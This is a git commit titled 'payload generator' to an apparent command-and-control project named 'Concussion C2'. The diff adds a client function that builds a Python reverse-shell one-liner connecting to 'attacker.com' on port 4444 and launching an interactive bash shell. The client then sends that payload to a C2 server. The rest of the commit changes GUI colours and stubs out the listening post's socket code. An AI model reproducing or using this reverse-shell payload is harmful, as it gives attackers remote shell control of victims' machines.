f795a0a2002e45aa0fc10799f8393144165e6d5f
DeadSilentSoS <deadsilentsos@gmail.com>
2023-09-19 14:47:37 -0500

    payload generator

--- client/client.py
+++ client/client.py
@@ -1,7 +1,6 @@
 import tkinter as tk
 import socket
 import threading
-import json
 
 # Define the server's IP address and port
 SERVER_IP = '0.0.0.0'
@@ -10,17 +9,50 @@ SERVER_PORT = 8081
 # Create the main application window
 root = tk.Tk()
 root.title("Concussion C2 Client")
-root.geometry("400x300")  # Adjust the window size as needed
+root.geometry("400x400")  # Adjust the window size as needed
 
-# 1. Use a Consistent Color Scheme
-primary_color = "#000098"
+# Define the common color scheme
+primary_color = "#3498db"
 secondary_color = "#2ecc71"
-background_color = "#000080"
-text_color = "#ffffff"
+background_color = "#f2f2f2"
+text_color = "#333333"
 
 root.configure(bg=background_color)
 
-# 2. Add Labels and Headings
+def send_command():
+    # Generate a reverse shell payload
+    reverse_shell_payload = generate_reverse_shell_payload("attacker.com", 4444)
+    
+    # Send the payload to the server
+    send_payload(reverse_shell_payload)
+
+def generate_reverse_shell_payload(ip, port):
+    # Implement logic to generate a reverse shell payload
+    payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
+    return payload
+
+def send_payload(payload):
+    try:
+        # Create a socket and establish a connection to the server
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((SERVER_IP, SERVER_PORT))
+
+        # Send the payload to the server
+        client_socket.send(payload.encode('utf-8'))
+
+        # Receive and process the response from the server (if applicable)
+        response_data = client_socket.recv(1024).decode('utf-8')
+        print(response_data)
+
+        # Close the client socket
+        client_socket.close()
+    except Exception as e:
+        print(f"Error: {e}")
+
+        # Handle connection or other errors gracefully
+        print(f"Server Status: Error - {e}")
+
+# Add Labels and Headings (unchanged)
 main_heading = tk.Label(root, text="Concussion C2 Client", font=("Helvetica", 16, "bold"), bg=primary_color, fg=text_color)
 main_heading.pack(pady=(20, 10))
 
@@ -28,54 +60,10 @@ main_heading.pack(pady=(20, 10))
 status_label = tk.Label(root, text="Server Status: Not Connected", bg=background_color)
 status_label.pack(pady=10)
 
-# Create an entry field for user input
-command_var = tk.StringVar()  # Create a StringVar to hold the entry text
-command_var.set("Enter your command")  # Set the default text
-command_entry = tk.Entry(root, width=40, font=("Helvetica", 12), bg="#ffffff", textvariable=command_var)
-command_entry.pack()
-
-# Function to send a command to the server
-def send_command():
-    command = command_var.get()
-    if command and command != "Enter your command":
-        try:
-            # Create a socket and establish a connection to the server
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((SERVER_IP, SERVER_PORT))
-
-            # Define a command dictionary with a "type" and "data" field
-            command_data = {"type": "command", "data": command}
-            # Serialize the command as JSON and send it to the server
-            client_socket.send(json.dumps(command_data).encode('utf-8'))
-
-            # Receive and process the response from the server
-            response_data = client_socket.recv(1024).decode('utf-8')
-            response = json.loads(response_data)
-            
-            if response["type"] == "response":
-                # Process the response as needed (e.g., display it)
-                status_label.config(text=f"Server Status: Response - {response['data']}")
-            else:
-                status_label.config(text="Server Status: Invalid Response")
-
-            # Close the client socket
-            client_socket.close()
-        except Exception as e:
-            print(f"Error: {e}")
-
-            # Handle connection or other errors gracefully
-            status_label.config(text=f"Server Status: Error - {e}")
-
-            # Close the client socket if an error occurs
-            client_socket.close()
-
-            # Optionally, you can log the error for debugging
-
-# 3. Improve Button Styling
+# Enhance Button Styling (unchanged)
 send_button = tk.Button(root, text="Send Command", bg=secondary_color, fg=text_color, command=send_command)
 send_button.pack()
 
-# ... (Other GUI code)
-
 # Run the GUI application
 root.mainloop()
+
--- listeningpost/listening_post.py
+++ listeningpost/listening_post.py
@@ -11,18 +11,18 @@ root = tk.Tk()
 root.title("Concussion C2 Listening Post")
 root.geometry("400x300")  # Adjust the window size as needed
 
-# 1. Use a Consistent Color Scheme
-primary_color = "#3498db"
-secondary_color = "#2ecc71"
-background_color = "#f2f2f2"
-text_color = "#333333"
+# Define the common color scheme
+primary_color = "#000046"
+secondary_color = "#41E67B"
+background_color = "#000046"
+text_color = "#00c8ff"
 
 root.configure(bg=background_color)
 
 def start_listening():
     print("listening logic goes here...")
 
-# 2. Add Labels and Headings
+# Add Labels and Headings
 main_heading = tk.Label(root, text="Concussion C2 Listening Post", font=("Helvetica", 16, "bold"), bg=primary_color, fg=text_color)
 main_heading.pack(pady=(20, 10))
 
@@ -30,49 +30,12 @@ main_heading.pack(pady=(20, 10))
 status_label = tk.Label(root, text="Listening Post Status: Not Listening", bg=background_color)
 status_label.pack(pady=10)
 
-# 3. Improve Button Styling
+# Enhance Button Styling
 start_button = tk.Button(root, text="Start Listening", bg=secondary_color, fg=text_color, command=start_listening)
 start_button.pack()
 
-# Placeholder for the start_listening function
-server_socket = None  # Store the server socket globally
-
-def start_listening():
-    global server_socket
-    try:
-        # Create a socket and start listening for incoming connections
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.bind((LISTENING_IP, LISTENING_PORT))
-        server_socket.listen()
-
-        status_label.config(text=f"Listening Post Status: Listening on {LISTENING_IP}:{LISTENING_PORT}")
-
-        # Start a thread to handle incoming connections
-        threading.Thread(target=accept_connections).start()
-    except Exception as e:
-        status_label.config(text=f"Listening Post Status: Error - {e}")
-
-# Function to accept incoming client connections
-def accept_connections():
-    while True:
-        client_socket, client_address = server_socket.accept()
-        status_label.config(text=f"Listening Post Status: Connected to {client_address}")
-        # Handle the connection here, e.g., process incoming data, send responses
-
-# Placeholder for the icon_button_event function
-def icon_button_event():
-    # Add code to handle the icon button click event
-    pass
-
-# 4. Enhance Entry Fields
-command_entry = tk.Entry(root, width=40, font=("Helvetica", 12), bg="#ffffff")
-command_entry.pack()
-
-# 5. Incorporate Icons (Replace with your icon path)
-icon_image = tk.PhotoImage(file="/home/noone/Desktop/Projects/Concussion/resources/icon.png")
-icon_button = tk.Button(root, image=icon_image, text="Icon Button", compound="left", bg=primary_color, fg=text_color, command=icon_button_event)
-icon_button.image = icon_image  # Store a reference to the image
-icon_button.pack(pady=20)
+# ... (Other GUI code)
 
 # Run the GUI application
 root.mainloop()
+
